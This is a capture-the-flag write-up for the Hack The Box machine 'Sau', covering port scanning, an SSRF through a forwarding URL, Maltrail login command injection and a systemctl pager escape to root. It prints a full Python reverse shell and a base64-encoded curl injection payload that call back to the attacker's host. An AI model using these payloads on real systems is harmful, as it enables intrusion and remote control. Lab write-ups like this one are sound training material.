@@ -1,0 +1,101 @@
+=====================================================================================================
+													******** HTB - machines: Sau ********
+=====================================================================================================
+Firstly I eported the IP as an env variable and ran an 'nmap' port scan on all ports on the target 
+machine.
+
+** export IP=10.10.11.224
+** nmap -n -Pn -p- $IP --open
+
+Nmap scan report for 10.10.11.224
+PORT      STATE SERVICE
+
+22/tcp    open  ssh
+55555/tcp open  unknown
+
+Next I will do a service enumeratio and run simple nmap scritos to find out more about the services up
+and running on the host with the below nmap command:
+
+** nmap -n -Pn -p22,55555 -sC -sV $IP
+
+Nmap scan report for 10.10.11.224
+Host is up (0.11s latency).
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
+|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
+|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
+55555/tcp open  unknown
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     X-Content-Type-Options: nosniff
+|     Date: Wed, 02 Aug 2023 21:43:59 GMT
+|     Content-Length: 75
+|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
+|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+
+---------------------------------------------------------------------------------------------------
+-- Enumeration:
+===============
+OS: Linux Ubuntu
+
+
+
+---------------------------------------------------------------------------------------------------
+-- Exploitation walkthrough:
+============================
+Since we have only two service running and we dont have any valid creds to login to the SSh service, we
+will focus on the other port which is running a web srver.
+
+On manual inspection of the web app, I noticed some API calls to '/web', '/api/baskets', and a master
+token stored in the local storage.
+
+On further examination of the '/web/basket_name' URL, i see that we can specify the forwarding URL.
+
+This looks suspectible to an open-redirect vuln which can lead to an SSRF vuln which i was right, cos I
+was able to redirect/forward the request to my local web server on kali. 
+
+Exploiting this open-redirect/SSRF by specifing '127.0.0.1:80' in the forwardig URL, and accessing the
+returned URL to access the basket, I got a new webpag for the 'maltrail'.
+
+During our nmap scan without the '--open' flag, I noticed port 80 and 8338 were filtered wich meant 
+they might only be accessible via localhost thus the port 80 on localhost above.
+
+Doing a google search on the maltrail app, i saw it is vuln to OS command injection in the login route.
+
+Editing the forwarding URL to 'http://127.0.0.1:80/login' and using a curl command to send a POST req
+to the login endpoint and base64 encoding our python revshell as the payload, we got a shell on kali.
+
+** python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((1"0.10.14.44",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+** curl http://10.10.11.224:55555/rum -d 'username=;`echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zOyBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTsgcy5jb25uZWN0KCgiMTAuMTAuMTQuNDQiLDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7Jw==|base64 -d|bash`'
+
+Now that we got a shell, we can get the user flag in th ehome directory of the user.
+
+To get root privs, i noticed that the usr can execute '/usr/bin/systemctl status trail.service' as root
+with no password as specified i the outpiut of 'sudo -l' command.
+
+To exploit this, we need to make sure the command runs in a pager so that we can execute a shell and 
+get root level privs.
+
+To achieve this we use the script command to gain an intractive tty which will make the comand run in a 
+pager.
+
+** script /dev/null -c bash
+** sudo /usr/bin/systemctl status trail.service
+** 'WARNING: terminal is not fully functional'
+** !bash
+
+We could also gain a stable sheel with our regular python comand, but this time we dont as the 'stty'
+command part, else the pager doesnt run for some reason.
+
+
+
